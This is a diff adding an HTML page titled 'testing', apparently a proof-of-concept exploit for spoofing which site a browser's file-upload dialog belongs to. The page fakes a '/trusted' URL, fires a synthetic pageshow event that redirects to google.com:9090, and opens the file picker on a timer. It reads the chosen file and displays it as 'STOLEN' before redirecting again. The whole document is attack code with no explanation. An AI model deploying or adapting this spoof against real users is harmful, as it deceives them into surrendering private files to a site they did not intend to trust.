@@ -1,0 +1,165 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>testing</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+      body {
+        margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, system-ui;
+        background: #f5f5f7;
+      }
+      button {
+        font-size: 15px;
+        padding: 10px 14px;
+        border-radius: 10px;
+        border: none;
+        background: #34c759;
+        color: #fff;
+        display: inline-block;
+        cursor: pointer;
+        font-weight: bold;
+      }
+      #panel {
+        display: none;
+        max-width: 420px;
+        margin: 80px auto;
+        background: #fff;
+        padding: 24px;
+        border-radius: 16px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+        text-align: center;
+      }
+      .notice {
+        margin-top: 14px;
+        font-size: 13px;
+        color: #b00020;
+        font-weight: bold;
+        display: none;
+      }
+      #file-info {
+        margin-top: 20px;
+        padding: 10px;
+        background: #e1f5fe;
+        border-radius: 8px;
+        font-family: monospace;
+        display: none;
+        color: #01579b;
+        border: 1px solid #b3e5fc;
+        text-align: center;
+      }
+      #stolen-image-preview {
+        max-width: 100%;
+        max-height: 200px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        margin-top: 10px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+      }
+    </style>
+  </head>
+  <body>
+    <div style="text-align: center; margin-top: 60px" id="trigger-container">
+      <button id="trigger" onclick="showPanel()">Click Here to Start</button>
+    </div>
+
+    <div id="panel">
+      <h2>Upload File Origin Spoof</h2>
+
+      <button onclick="triggerFileBypass()">Select File</button>
+
+      <input
+        type="file"
+        id="hidden-file-input"
+        style="display: none"
+        onchange="fileSelected(this)"
+        accept="image/*"
+      />
+
+      <p id="output">Status: -</p>
+      <div id="file-info"></div>
+      <div class="notice" id="spoof-success">SPOOFED</div>
+    </div>
+
+    <script>
+      const panel = document.getElementById("panel");
+      const triggerContainer = document.getElementById("trigger-container");
+      const output = document.getElementById("output");
+      const spoofSuccess = document.getElementById("spoof-success");
+      const fileInput = document.getElementById("hidden-file-input");
+      const fileInfo = document.getElementById("file-info");
+
+      let readyToSpoof = false;
+
+      function showPanel() {
+        triggerContainer.style.display = "none";
+        panel.style.display = "block";
+        history.pushState({}, "", "/trusted");
+      }
+
+      function triggerFileBypass() {
+        readyToSpoof = true;
+        window.dispatchEvent(new Event("pageshow"));
+
+        setTimeout(() => {
+          fileInput.click();
+        }, 500);
+      }
+
+      function fileSelected(input) {
+        if (input.files && input.files[0]) {
+          const file = input.files[0];
+
+          fileInfo.innerHTML = '';
+          fileInfo.style.display = "none";
+          spoofSuccess.style.display = "none";
+          output.textContent = "Status: Capturing Stolen Data...";
+
+          if (file.type && file.type.startsWith('image/')) {
+            const reader = new FileReader();
+
+            reader.onload = function(e) {
+              fileInfo.style.display = "block";
+              
+              const imgHtml = `
+                <b>STOLEN IMAGE CONTENT:</b><br>
+                Name: ${file.name}<br>
+                <img id="stolen-image-preview" src="${e.target.result}" />
+              `;
+              fileInfo.innerHTML = imgHtml;
+              
+              spoofSuccess.style.display = "block";
+              spoofSuccess.textContent = "SPOOFED & IMAGE CAPTURED!";
+              output.textContent = "Status: Upload Complete. Syncing...";
+            }
+
+            reader.readAsDataURL(file);
+          } else {
+            fileInfo.style.display = "block";
+            fileInfo.innerHTML = `<b>STOLEN DATA (TEXT):</b><br>Name: ${file.name}<br>Type: ${file.type}`;
+            spoofSuccess.style.display = "block";
+          }
+
+          setTimeout(() => {
+            window.location.href = "https://google.com";
+          }, 500);
+        }
+      }
+
+      window.addEventListener("pageshow", () => {
+        if (!readyToSpoof) return;
+
+        requestAnimationFrame(() => {
+          requestAnimationFrame(() => {
+            setTimeout(() => {
+              location.href = "https://google.com:9090";
+            }, 80);
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
